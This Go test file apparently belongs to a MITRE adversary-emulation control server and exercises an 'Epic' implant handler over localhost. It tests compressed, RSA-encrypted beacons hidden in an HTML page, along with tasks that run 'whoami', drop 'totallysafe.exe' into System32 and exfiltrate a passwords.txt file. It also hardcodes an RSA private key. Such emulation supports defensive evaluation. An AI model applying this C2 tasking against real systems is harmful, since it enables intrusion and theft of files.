package epic

import (
	"bytes"
	"crypto/md5"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
	"testing"
	"time"

	"attackevals.mitre-engenuity.org/control_server/config"
	"attackevals.mitre-engenuity.org/control_server/handlers/util"
	"attackevals.mitre-engenuity.org/control_server/restapi"
	"github.com/dsnet/compress/bzip2"
)

const (
    handlerName       = "epic"
    restAPIlistenHost = "127.0.0.1:9993"
    restAPIBaseURL    = "http://" + restAPIlistenHost + "/api/v1.0/"
    serverURLHttp     = "http://127.0.0.1:8080/"
    serverURLHttps    = "https://127.0.0.1:8443"
    serverMsgOK       = "200 OK"
    serverMsgError    = "500 Internal Server Error"
    templatePath      = "templates/home.html"
    htmlTemplate      = `<html>
<head>
<title>Authentication Required</title>
</head>

<body>
<div>%s</div>
</body>
</html>
`
    implantRequestTemplate    = "{\"UUID\":\"%s\", \"type\":\"%s\", \"data\":\"%s\"}"
    invalidTest               = "invalid Test"
    testingTask               = "exe | whoami"
    helloWorldFilename        = "hello_world.elf"
    helloWorldElfHash         = "fe7c47d38224529c7d8f9a11a62cdd7a"
    testingDownloadTask       = "name | C:\\Windows\\System32\\totallysafe.exe | " + helloWorldFilename
    invalidDownloadTask       = "name | C:\\Windows\\System32\\totallysafe.exe | " + invalidTest
    invalidDownloadTaskErrMsg = "Download failed. Error Code: 2"
    testingUploadTaskFilename = "C:\\Users\\bob\\passwords.txt"
    testingUploadTask         = "result | " + testingUploadTaskFilename
    testingDeleteTask         = "del_task | C\\Users\\bob\\passwords.txt"
    invalidDeleteTaskErrMsg   = "Delete failed. Error Code: 2"
    testingData               = "testing data"
    testingFilename           = "test.txt"
)

var configEntryHttp = config.HandlerConfigEntry{
    "host":      "127.0.0.1",
    "port":      "8080",
    "use_https": "false",
}

var configEntryHttps = config.HandlerConfigEntry{
    "host":      "127.0.0.1",
    "port":      "8443",
    "cert_file": "",
    "key_file":  "",
    "use_https": "true",
}

func startEpicHandler(handler *EpicHandler, configEntry config.HandlerConfigEntry, test *testing.T) {
    if err := handler.StartHandler(restAPIlistenHost, configEntry); err != nil {
        useHttpsBool, err := strconv.ParseBool(configEntry["use_https"])
        if err != nil {
            test.Error(err)
        }

        if useHttpsBool {
            test.Errorf("Error when starting Epic HTTPS handler: %s", err.Error())
        } else {
            test.Errorf("Error when starting Epic HTTP handler: %s", err.Error())
        }
    }
    util.RunningHandlers[handlerName] = handler
    time.Sleep(50 * time.Millisecond)
}

func stopEpicHandler(handler *EpicHandler, test *testing.T) {
    if err := handler.StopHandler(); err != nil {
        test.Errorf("Error when stopping Epic HTTP handler: %s", err.Error())
    }
    delete(util.RunningHandlers, handlerName)
    time.Sleep(50 * time.Millisecond)
}

func TestStartStopEpicHandler(test *testing.T) {
    handler := epicHandlerFactory(htmlResponseWrapper, templatePath)
    startEpicHandler(handler, configEntryHttp, test)
    defer stopEpicHandler(handler, test)
}

func TestStartStopEpicsHandler(test *testing.T) {
    handler := epicHandlerFactory(htmlResponseWrapper, templatePath)
    startEpicHandler(handler, configEntryHttps, test)
    defer stopEpicHandler(handler, test)
}

func startRESTAPI(test *testing.T) {
    restapi.Start(restAPIlistenHost, "./test_payloads")
    time.Sleep(50 * time.Millisecond)
    test.Log("Started REST API server")
}

func stopRESTAPI(test *testing.T) {
    restapi.Stop()
    time.Sleep(50 * time.Millisecond)
    test.Log("Stopped REST API server")
}

func sendImplantRequest(test *testing.T, serverURL string, request string, encrypt bool) (string, []byte) {
    // compress with bzip2
    var bzip2Output bytes.Buffer
    bzip2Writer, err := bzip2.NewWriter(&bzip2Output, nil)
    if err != nil {
        test.Error(err.Error())
    }
    _, err = bzip2Writer.Write([]byte(request))
    if err != nil {
        test.Error(err.Error())
    }
    err = bzip2Writer.Close()
    if err != nil {
        test.Error(err.Error())
    }

    // encrypt
    if (encrypt) {
        loadedPublicKey, err := ImportRsaPubKey("")
        if err != nil {
            test.Error(err.Error())
        }
        Encrypt(bzip2Output.Bytes(), loadedPublicKey)
    }

    // base64 encode
    reqBody := base64.StdEncoding.EncodeToString(bzip2Output.Bytes())

    // make POST request
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
    req, err := http.NewRequest("POST", serverURL, bytes.NewBuffer([]byte(reqBody)))
    if err != nil {
        test.Error(err)
    }

    // send POST request
    client := &http.Client{}
    response, err := client.Do(req)
    if err != nil {
        test.Error(err)
    }

    // get response
    defer response.Body.Close()
    body, err := ioutil.ReadAll(response.Body)
    if err != nil {
        test.Error(err)
    }
    status := response.Status

    return status, body
}

func sendImplantRequestAndCheck(test *testing.T, serverURL string, request string, statusExpected string, bodyExpected string, encrypt bool) {
    status, body := sendImplantRequest(test, serverURL, request, encrypt)
    startResponse := strings.Index(string(body), "<div>") + len("<div>")
    endResponse := strings.Index(string(body), "</div>")
    var decompressedResponse []byte
    if endResponse != -1 {
        response := string(body)[startResponse:endResponse]
    
        decodedResponse, err := Base64Decode(string(response))
        if err != nil {
            test.Error(err.Error())
        }
        loadedPrivateKey, err := ImportRsaPrivKey("MIIEowIBAAKCAQEAwW0oKmH7vxoenqqYijGD9RALZfAEPC4auVp1wyrQ2j/7sD7ecWcylXgu+3YMqGuUrQdUKswmRMlvLfwiiqeyjFusMi+IILL+Sue5hGKJ5BPGCGO6gl4Hr8WcNCQ7f/idT8x5mvhcSlrTZb/Nit5X5kCZymomQE1dDVwUv+5YSap2zwaqE7oNch6kTBgRut5nZaPqg1NS+V5zrEpoKcu1VQ7cvOwrvdAKQYIfX+04Jg9DNMZDo18wp6lhQ1CEiHP7rxo2znyKYOG9irRX0VIBW8TQbp5flf3GXKJRRmhMtA8Nq3om0P6wMP2cTt6QFevIczhOYnU3ZwnLjxJp3WcSOQIDAQABAoIBAAdFBUghtAOSXwmi9/LkE7il2GyfRDF7OoLldpAviRDvn0bk95kQgiZIkY94eApRnMSSBj5J7ohFGW1QUOYGkaw6+v8Z3TmWMJhITdpYliRUMx9E/3eZD09/LRs8LCy0ZdX5ckdgqgToLyv5G1sERA51A0xIIaIaDKZZyk5AwXqA1MGyuI4J1PKUkQ+tC3rfcFuG0Ig+u30G+8f0YkaYCcK7+IXMv2Ezp/hOGsuA8B2sHsDs3QyEzKPJQjMojP9GW9XJ0Gy0s+Twq5+i6taO4mL5zqrTp0A0vtaY6xLRghd3SBtqBwYzpbIh4gKdJAdALadG058H2Od/3pPlfKJ7UGcCgYEA7IIEW+GB1/moySDmy+5k7UnzrgsVCJBuj5/vlFkdl/xPFSJxPleoPxv/LjLMx/vsauDdN6TFoCYYqxtehs+LgW/581iVO76ynvsv7J4aygyoLKSNMJwUA0KnxftUqWbUDkYNFRcuWZLF8oCf4kldjKG8PnTdeduzah33utYOrnsCgYEA0V4uZjA5tPxp4OwX7X6YQlSQZSSvG4zcDy/0stl+B3Cz4jwB2KYPjx5FGfA3ykOTTzPtlMC5D5En0p8u/p+1bJBgZl6z3sPMzTCfB00ac+1yFwR51kh6Ly2VzclWdMCW828OoXlYszm0e9NXu6eDR1Ft9WXuTa+CW4Vn/zzlvdsCgYBkSLkqcJOLDbypE/9pJ3u6NipSeTaA/CU1V17SK3tl78Fkt8cG5UpdADUS1M2KWuMjapfCuWZnAuBg5WkOhsCjsORub/hPbgv1Z5MppNy9IeLJkzifDP9bZo8XXvvGHOj76G4xrDOmHZs7uZiR7gPx1r6oSQuEWUlZTL23hn6RMwKBgCdSrhpJUn1YrzYsga38ifJjWZ91jWH6SdacZjQ1P0N8enyyUpJzVhbGU6o0gPX/TSqiESxQKjHvTHB1r2jpbDTQxRpVDSl40v1y9Vt0stQ1M6l5EL0bbb9wq2M0PoW9Klzcbf4MAYnf+7MKFb9MDg8WDzX5CBIVNcGkw8yfjnLjAoGBAOCvNGQIVx+sa775Tx3Fyq6+PfvG4ETtMcdlgiJdSXmGIKJ8aboAcuu3hHsasKEcbB0brtqaNi5w/0WgDKAFruh0ZLxZa/UGS2VTNnlXbF/bDUQd28D0KhKAyYV/v3aNf/cZVRsX4qiPfUfCd0oYxS8/rHEgi6qz2PSgAC8KxVuc")
        if err != nil {
            test.Error(err.Error())
        }
        decryptedResponse, err := Decrypt(decodedResponse, loadedPrivateKey)
        if err != nil {
            test.Error(err.Error())
        }
        decompressedResponse, err = Bzip2Decompress(decryptedResponse)
        if err != nil {
            test.Error(err.Error())
        }
    } else {
        decompressedResponse = body
    }
    if string(status) != statusExpected {
        test.Errorf("Status mismatch, got '%s' expected '%s' for request %s", string(status), statusExpected, request)
    }
    if string(decompressedResponse) != bodyExpected {
        test.Errorf("Body mismatch, got '%s' expected '%s'", string(body), bodyExpected)
    }
}

func TestImplantRequest(test *testing.T) {
    // set current working directory to main repo directory to access ./files
    // 'go test' puts us in epic directory instead of the project root directory
    cwd, _ := os.Getwd()
    os.Chdir("../../")
    defer os.Chdir(cwd) // restore cwd at end of test

    serverURLs := [2]string{serverURLHttp, serverURLHttps}
    configs := [2]config.HandlerConfigEntry{configEntryHttp, configEntryHttps}

    // base64 encode the data field
    testingDataBase64Encoded := base64.StdEncoding.EncodeToString([]byte(testingData))

    // run the tests once for http and once for https
    for i := range serverURLs {
        serverURL := serverURLs[i]
        config := configs[i]

        // start REST API
        startRESTAPI(test)
        defer stopRESTAPI(test)

        handler := epicHandlerFactory(htmlResponseWrapper, "handlers/epic/"+templatePath)

        // start handler
        startEpicHandler(handler, config, test)
        defer stopEpicHandler(handler, test)

        // Send implant request with no UUID, expect to get back response with new UUID
        request := fmt.Sprintf(implantRequestTemplate, "", "command", testingDataBase64Encoded)
        responseWant := "\x00\x00\x00\x00\x00\x00\x00\x00\x1e\x00\x00\x00ID = 218780a0-870e-480e-b2c5dc"
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgOK, responseWant, false)

        // Send implant request with existing UUID, expect to get back response with no UUID
        request = fmt.Sprintf(implantRequestTemplate, firstUUID, "command", testingDataBase64Encoded)
        responseWant = "\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgOK, responseWant, true)

        // Send implant request with UUID that doesn't exist, expect to get back 500 error
        request = fmt.Sprintf(implantRequestTemplate, invalidTest, "command", testingDataBase64Encoded)
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgError, serverErrMsg, true)

        // Test file download
        // set task
        _, err := setTask(testingDownloadTask, firstUUID)
        if err != nil {
            test.Error(err.Error())
        }
        // filler command to get the server to send the file
        request = fmt.Sprintf(implantRequestTemplate, firstUUID, "command", testingDataBase64Encoded)
        status, _ := sendImplantRequest(test, serverURL, request, true)
        if string(status) != serverMsgOK {
            test.Errorf("Status mismatch, got '%s' expected '%s' for request %s", string(status), serverMsgOK, request)
        }
        // send back success message
        request = fmt.Sprintf(implantRequestTemplate, firstUUID, "download", "")
        responseWant = "\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgOK, responseWant, true)

        // set task to download invalid file
        _, err = setTask(invalidDownloadTask, firstUUID)
        if err != nil {
            test.Error(err.Error())
        }
        // filler command to get the server to send the file
        request = fmt.Sprintf(implantRequestTemplate, firstUUID, "command", testingDataBase64Encoded)
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgError, serverErrMsg, true)
        // send back error message
        invalidDownloadTaskErrMsgBase64Encoded := base64.StdEncoding.EncodeToString([]byte(invalidDownloadTaskErrMsg))
        request = fmt.Sprintf(implantRequestTemplate, firstUUID, "download", invalidDownloadTaskErrMsgBase64Encoded)
        responseWant = "\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgOK, responseWant, true)

        // Test file upload
        // set task
        _, err = setTask(testingUploadTask, firstUUID)
        if err != nil {
            test.Error(err.Error())
        }
        // send filler implant request so we get the task to upload file
        request = fmt.Sprintf(implantRequestTemplate, firstUUID, "command", testingDataBase64Encoded)
        // [config]result = C:\Users\bob\passwords.txt
        responseWant = "\x05\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00\x72\x65\x73\x75\x6c\x74\x20\x3d\x20\x43\x3a\x5c\x55\x73\x65\x72\x73\x5c\x62\x6f\x62\x5c\x70\x61\x73\x73\x77\x6f\x72\x64\x73\x2e\x74\x78\x74"
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgOK, responseWant, true)
        // upload the file
        request = fmt.Sprintf(implantRequestTemplate, firstUUID, "upload", testingDataBase64Encoded)
        responseWant = "\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgOK, responseWant, true)
        // try to upload the file a second time when there is no file tasked to be uploaded
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgError, serverErrMsg, true)

        // Test file deletion
        // set task
        _, err = setTask(testingDeleteTask, firstUUID)
        if err != nil {
            test.Error(err.Error())
        }
        // send filler implant request so we get the task to delete file
        request = fmt.Sprintf(implantRequestTemplate, firstUUID, "command", testingDataBase64Encoded)
        // [config]del_task = \nname = C\Users\bob\passwords.txt
        responseWant = "\x07\x00\x00\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x64\x65\x6c\x5f\x74\x61\x73\x6b\x20\x3d\x20\x0a\x6e\x61\x6d\x65\x20\x3d\x20\x43\x5c\x55\x73\x65\x72\x73\x5c\x62\x6f\x62\x5c\x70\x61\x73\x73\x77\x6f\x72\x64\x73\x2e\x74\x78\x74"
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgOK, responseWant, true)
        // send back success message
        request = fmt.Sprintf(implantRequestTemplate, firstUUID, "delete", testingDataBase64Encoded)
        responseWant = "\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgOK, responseWant, true)
        // send back error message
        invalidDeleteTaskErrMsgBase64Encoded := base64.StdEncoding.EncodeToString([]byte(invalidDeleteTaskErrMsg))
        request = fmt.Sprintf(implantRequestTemplate, firstUUID, "delete", invalidDeleteTaskErrMsgBase64Encoded)
        responseWant = "\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        sendImplantRequestAndCheck(test, serverURL, request, serverMsgOK, responseWant, true)
    }
}

func TestHasImplantSessionAndStoreImplantSession(test *testing.T) {
    handler := epicHandlerFactory(htmlResponseWrapper, templatePath)
    startEpicHandler(handler, configEntryHttp, test)
    defer stopEpicHandler(handler, test)

    // send UUID that does not exist and get back error
    if handler.hasImplantSession(invalidTest) {
        test.Error("Implant should not have an active session: " + invalidTest)
    }

    // create new session with UUID and check that the session is stored
    handler.commandNumbers[firstUUID] = 0
    if !handler.hasImplantSession(firstUUID) {
        test.Error("Expected implant session to be stored.")
    }
}

func TestCreateNewSessionDataBytes(test *testing.T) {
    want := fmt.Sprintf("{\"guid\":\"%s\"}", firstUUID)
    result := string(createNewSessionDataBytes(firstUUID))
    if result != want {
        test.Errorf("Expected %s; got: %s", want, result)
    }
}

func TestForwardRegisterImplant(test *testing.T) {
    // start REST API
    startRESTAPI(test)
    defer stopRESTAPI(test)

    handler := epicHandlerFactory(htmlResponseWrapper, templatePath)

    // start handler
    startEpicHandler(handler, configEntryHttp, test)
    defer stopEpicHandler(handler, test)

    // test that session can be registered
    restResponseOkWant := "Successfully added session."
    implantData := []byte("{\"guid\":\"test\"}")
    restResponse, err := forwardRegisterImplant(restAPIlistenHost, implantData)
    if err != nil {
        test.Error(err.Error())
    } else if restResponse != restResponseOkWant {
        test.Errorf("Status mismatch, got '%s' expected '%s'", restResponse, restResponseOkWant)
    }

    // test that invalid data is sent for registration
    implantData = []byte(invalidTest)
    restResponse, err = forwardRegisterImplant(restAPIlistenHost, implantData)
    if err != nil {
        test.Error(err.Error())
    } else if restResponse == restResponseOkWant {
        test.Errorf("Got success message, error message expected.")
    }
}

func TestRegisterNewImplant(test *testing.T) {
    // start REST API
    startRESTAPI(test)
    defer stopRESTAPI(test)

    handler := epicHandlerFactory(htmlResponseWrapper, templatePath)

    // start handler
    startEpicHandler(handler, configEntryHttp, test)
    defer stopEpicHandler(handler, test)

    // first registration
    idWant := firstUUID
    id, err := handler.registerNewImplant()
    if err != nil {
        test.Error(err.Error())
    } else if id != idWant {
        test.Errorf("Status mismatch, got '%s' expected '%s'", id, idWant)
    }

    // second registration
    idWant = secondUUID
    id, err = handler.registerNewImplant()
    if err != nil {
        test.Error(err.Error())
    } else if id != idWant {
        test.Errorf("Status mismatch, got '%s' expected '%s'", id, idWant)
    }

    // next registration should go back to the first UUID
    idWant = firstUUID
    id, err = handler.registerNewImplant()
    if err != nil {
        test.Error(err.Error())
    } else if id != idWant {
        test.Errorf("Status mismatch, got '%s' expected '%s'", id, idWant)
    }

    // fourth registration should use second UUID
    idWant = secondUUID
    id, err = handler.registerNewImplant()
    if err != nil {
        test.Error(err.Error())
    } else if id != idWant {
        test.Errorf("Status mismatch, got '%s' expected '%s'", id, idWant)
    }
}

func TestProcessAndForwardUpload(test *testing.T) {
    // set current working directory to main repo directory to access ./files
    // 'go test' puts us in epic directory instead of the project root directory
    cwd, _ := os.Getwd()
    os.Chdir("../../")
    defer os.Chdir(cwd) // restore cwd at end of test

    // start REST API
    startRESTAPI(test)
    defer stopRESTAPI(test)

    handler := epicHandlerFactory(htmlResponseWrapper, "handlers/epic/"+templatePath)

    // start handler
    startEpicHandler(handler, configEntryHttp, test)
    defer stopEpicHandler(handler, test)

    // test uploading a file
    responseWant := fmt.Sprintf("Successfully uploaded file to control server at './files/%s'", testingFilename)
    result, err := processAndForwardUpload(restAPIlistenHost, testingFilename, []byte(testingData))
    if err != nil {
        test.Error(err.Error())
    } else if result != responseWant {
        test.Errorf("Status mismatch, got '%s' expected '%s'", result, responseWant)
    }
}

func setTask(task string, uuid string) (string, error) {
    url := restAPIBaseURL + "session/" + uuid + "/task"

    // setup HTTP POST request
    request, err := http.NewRequest("POST", url, bytes.NewBufferString(task))
    if err != nil {
        return "", err
    }

    // execute HTTP POST and read response
    client := &http.Client{}
    response, err := client.Do(request)
    if err != nil {
        return "", err
    }

    defer response.Body.Close()
    if response.StatusCode != 200 {
        return "", fmt.Errorf("Expected error code 200, got %v", response.StatusCode)
    }
    body, err := ioutil.ReadAll(response.Body)
    return string(body[:]), err
}

func TestForwardGetTask(test *testing.T) {
    // start REST API
    startRESTAPI(test)
    defer stopRESTAPI(test)

    handler := epicHandlerFactory(htmlResponseWrapper, templatePath)

    // start handler
    startEpicHandler(handler, configEntryHttp, test)
    defer stopEpicHandler(handler, test)

    // test that empty string is received when no task is set
    sessionData, err := forwardGetTask(restAPIlistenHost, firstUUID)
    if err != nil {
        test.Error(err.Error())
    } else if sessionData != "" {
        test.Errorf("Status mismatch, got '%s' expected '%s'", sessionData, "")
    }

    // set a task
    _, err = setTask(testingTask, firstUUID)
    if err != nil {
        test.Error(err.Error())
    }

    // check that we can receive a set task
    sessionData, err = forwardGetTask(restAPIlistenHost, firstUUID)
    if err != nil {
        test.Error(err)
    } else if sessionData != testingTask {
        test.Errorf("Expected %v, got %v", testingTask, sessionData)
    }

}

func TestForwardGetFileFromServer(test *testing.T) {
    // set current working directory to main repo directory to access ./files
    // 'go test' puts us in epic directory instead of the project root directory
    cwd, _ := os.Getwd()
    os.Chdir("../../")
    defer os.Chdir(cwd) // restore cwd at end of test

    // start REST API
    startRESTAPI(test)
    defer stopRESTAPI(test)

    handler := epicHandlerFactory(htmlResponseWrapper, "handlers/epic/"+templatePath)

    // start handler
    startEpicHandler(handler, configEntryHttp, test)
    defer stopEpicHandler(handler, test)

    // test downloading a file
    fileData, err := forwardGetFileFromServer(restAPIlistenHost, helloWorldFilename)
    if err != nil {
        test.Error(err.Error())
    }

    // compare file hashes
    hash := md5.Sum(fileData)
    actualHash := hex.EncodeToString(hash[:])
    if helloWorldElfHash != actualHash {
        test.Errorf("Expected %v, got %v", helloWorldElfHash, actualHash)
    }

    // test downloading non-existent file
    responseErrorWant := fmt.Sprintf("Server did not return requested file: %s", invalidTest)
    _, err = forwardGetFileFromServer(restAPIlistenHost, invalidTest)
    if err != nil {
        if err.Error() != responseErrorWant {
            test.Errorf("Expected error message: '%s'; got: '%s'", responseErrorWant, err.Error())
        }
    } else {
        test.Error("Expected error message.")
    }
}

func convertTaskToResponseAndCheck(test *testing.T, epicHandler *EpicHandler, id string, taskString string, newImplant bool, responseWant string) {
    response, err := epicHandler.convertTaskToResponse(id, taskString, newImplant)
    startResponse := strings.Index(string(response), "<div>") + len("<div>")
    endResponse := strings.Index(string(response), "</div>")
    var decompressedResponse []byte
    if endResponse != -1 {
        encodedResponse := string(response)[startResponse:endResponse]
    
        decodedResponse, err := Base64Decode(string(encodedResponse))
        if err != nil {
            test.Error(err.Error())
        }
        loadedPrivateKey, err := ImportRsaPrivKey("MIIEowIBAAKCAQEAwW0oKmH7vxoenqqYijGD9RALZfAEPC4auVp1wyrQ2j/7sD7ecWcylXgu+3YMqGuUrQdUKswmRMlvLfwiiqeyjFusMi+IILL+Sue5hGKJ5BPGCGO6gl4Hr8WcNCQ7f/idT8x5mvhcSlrTZb/Nit5X5kCZymomQE1dDVwUv+5YSap2zwaqE7oNch6kTBgRut5nZaPqg1NS+V5zrEpoKcu1VQ7cvOwrvdAKQYIfX+04Jg9DNMZDo18wp6lhQ1CEiHP7rxo2znyKYOG9irRX0VIBW8TQbp5flf3GXKJRRmhMtA8Nq3om0P6wMP2cTt6QFevIczhOYnU3ZwnLjxJp3WcSOQIDAQABAoIBAAdFBUghtAOSXwmi9/LkE7il2GyfRDF7OoLldpAviRDvn0bk95kQgiZIkY94eApRnMSSBj5J7ohFGW1QUOYGkaw6+v8Z3TmWMJhITdpYliRUMx9E/3eZD09/LRs8LCy0ZdX5ckdgqgToLyv5G1sERA51A0xIIaIaDKZZyk5AwXqA1MGyuI4J1PKUkQ+tC3rfcFuG0Ig+u30G+8f0YkaYCcK7+IXMv2Ezp/hOGsuA8B2sHsDs3QyEzKPJQjMojP9GW9XJ0Gy0s+Twq5+i6taO4mL5zqrTp0A0vtaY6xLRghd3SBtqBwYzpbIh4gKdJAdALadG058H2Od/3pPlfKJ7UGcCgYEA7IIEW+GB1/moySDmy+5k7UnzrgsVCJBuj5/vlFkdl/xPFSJxPleoPxv/LjLMx/vsauDdN6TFoCYYqxtehs+LgW/581iVO76ynvsv7J4aygyoLKSNMJwUA0KnxftUqWbUDkYNFRcuWZLF8oCf4kldjKG8PnTdeduzah33utYOrnsCgYEA0V4uZjA5tPxp4OwX7X6YQlSQZSSvG4zcDy/0stl+B3Cz4jwB2KYPjx5FGfA3ykOTTzPtlMC5D5En0p8u/p+1bJBgZl6z3sPMzTCfB00ac+1yFwR51kh6Ly2VzclWdMCW828OoXlYszm0e9NXu6eDR1Ft9WXuTa+CW4Vn/zzlvdsCgYBkSLkqcJOLDbypE/9pJ3u6NipSeTaA/CU1V17SK3tl78Fkt8cG5UpdADUS1M2KWuMjapfCuWZnAuBg5WkOhsCjsORub/hPbgv1Z5MppNy9IeLJkzifDP9bZo8XXvvGHOj76G4xrDOmHZs7uZiR7gPx1r6oSQuEWUlZTL23hn6RMwKBgCdSrhpJUn1YrzYsga38ifJjWZ91jWH6SdacZjQ1P0N8enyyUpJzVhbGU6o0gPX/TSqiESxQKjHvTHB1r2jpbDTQxRpVDSl40v1y9Vt0stQ1M6l5EL0bbb9wq2M0PoW9Klzcbf4MAYnf+7MKFb9MDg8WDzX5CBIVNcGkw8yfjnLjAoGBAOCvNGQIVx+sa775Tx3Fyq6+PfvG4ETtMcdlgiJdSXmGIKJ8aboAcuu3hHsasKEcbB0brtqaNi5w/0WgDKAFruh0ZLxZa/UGS2VTNnlXbF/bDUQd28D0KhKAyYV/v3aNf/cZVRsX4qiPfUfCd0oYxS8/rHEgi6qz2PSgAC8KxVuc")
        if err != nil {
            test.Error(err.Error())
        }
        decryptedResponse, err := Decrypt(decodedResponse, loadedPrivateKey)
        if err != nil {
            test.Error(err.Error())
        }
        decompressedResponse, err = Bzip2Decompress(decryptedResponse)
        if err != nil {
            test.Error(err.Error())
        }
    } else {
        decompressedResponse = []byte(response)
    }
    if err != nil {
        test.Error(err.Error())
    } else if string(decompressedResponse) != responseWant {
        test.Errorf("Status mismatch, got '%s' expected '%s'", response, responseWant)
    }
}

func TestConvertTaskToResponse(test *testing.T) {
    // set current working directory to main repo directory to access ./files
    // 'go test' puts us in epic directory instead of the project root directory
    cwd, _ := os.Getwd()
    os.Chdir("../../")
    defer os.Chdir(cwd) // restore cwd at end of test

    // start REST API
    startRESTAPI(test)
    defer stopRESTAPI(test)

    handler := epicHandlerFactory(htmlResponseWrapper, "handlers/epic/"+templatePath)

    // start handler
    startEpicHandler(handler, configEntryHttp, test)
    defer stopEpicHandler(handler, test)

    // test that an error returns when an invalid task is given
    responseErrorWant := fmt.Sprintf("Task has an incorrect number of arguments. Expected at least 2 '|' delimited, got 1. Provided: '%s'", invalidTest)
    _, err := handler.convertTaskToResponse(firstUUID, invalidTest, false)
    if err != nil {
        if err.Error() != responseErrorWant {
            test.Errorf("Expected error message: '%s'; got: '%s'", responseErrorWant, err.Error())
        }
    } else {
        test.Error("Expected error message.")
    }

    // test conversion with a task and existing user
    // [config]exe = whoami
    responseWant := "\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x65\x78\x65\x20\x3d\x20\x77\x68\x6f\x61\x6d\x69"
    convertTaskToResponseAndCheck(test, handler, firstUUID, testingTask, false, responseWant)

    // test conversion with no task and existing user
    responseWant = "\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    convertTaskToResponseAndCheck(test, handler, firstUUID, "", false, responseWant)

    // test conversion with no task and new user
    // [config]ID = 218780a0-870e-480e-b2c5dc
    responseWant = "\x02\x00\x00\x00\x00\x00\x00\x00\x1e\x00\x00\x00\x49\x44\x20\x3d\x20\x32\x31\x38\x37\x38\x30\x61\x30\x2d\x38\x37\x30\x65\x2d\x34\x38\x30\x65\x2d\x62\x32\x63\x35\x64\x63"
    convertTaskToResponseAndCheck(test, handler, firstUUID, "", true, responseWant)

    // test conversion with a task and new user
    // [config]ID = 218780a0-870e-480e-b2c5dc\nexe = whoami
    responseWant = "\x03\x00\x00\x00\x00\x00\x00\x00\x2b\x00\x00\x00\x49\x44\x20\x3d\x20\x32\x31\x38\x37\x38\x30\x61\x30\x2d\x38\x37\x30\x65\x2d\x34\x38\x30\x65\x2d\x62\x32\x63\x35\x64\x63\x0a\x65\x78\x65\x20\x3d\x20\x77\x68\x6f\x61\x6d\x69"
    convertTaskToResponseAndCheck(test, handler, firstUUID, testingTask, true, responseWant)

    // test download task
    _, err = handler.convertTaskToResponse(firstUUID, testingDownloadTask, false)
    if err != nil {
        test.Error(err.Error())
    }

    // test downloading non-existent file
    responseErrorWant = fmt.Sprintf("Unable to retrieve file from server: Server did not return requested file: %s", invalidTest)
    _, err = handler.convertTaskToResponse(firstUUID, invalidDownloadTask, false)
    if err != nil {
        if err.Error() != responseErrorWant {
            test.Errorf("Expected error message: '%s'; got: '%s'", responseErrorWant, err.Error())
        }
    } else {
        test.Error("Expected error message.")
    }

    // test upload task
    // [config]result = C:\Users\bob\passwords.txt
    responseWant = "\x05\x00\x00\x00\x00\x00\x00\x00\x23\x00\x00\x00\x72\x65\x73\x75\x6c\x74\x20\x3d\x20\x43\x3a\x5c\x55\x73\x65\x72\x73\x5c\x62\x6f\x62\x5c\x70\x61\x73\x73\x77\x6f\x72\x64\x73\x2e\x74\x78\x74"
    convertTaskToResponseAndCheck(test, handler, firstUUID, testingUploadTask, false, responseWant)
    if handler.pendingUploads[firstUUID] != testingUploadTaskFilename {
        test.Errorf("Status mismatch, got '%s' for pending upload filename, expected '%s'", handler.pendingUploads[firstUUID], testingUploadTaskFilename)
    }

    // test delete task
    // [config]del_task = \nname = C\Users\bob\passwords.txt
    responseWant = "\x06\x00\x00\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x64\x65\x6c\x5f\x74\x61\x73\x6b\x20\x3d\x20\x0a\x6e\x61\x6d\x65\x20\x3d\x20\x43\x5c\x55\x73\x65\x72\x73\x5c\x62\x6f\x62\x5c\x70\x61\x73\x73\x77\x6f\x72\x64\x73\x2e\x74\x78\x74"
    convertTaskToResponseAndCheck(test, handler, firstUUID, testingDeleteTask, false, responseWant)

    // the tests above also makes sure that command ID increases by one for each task
}
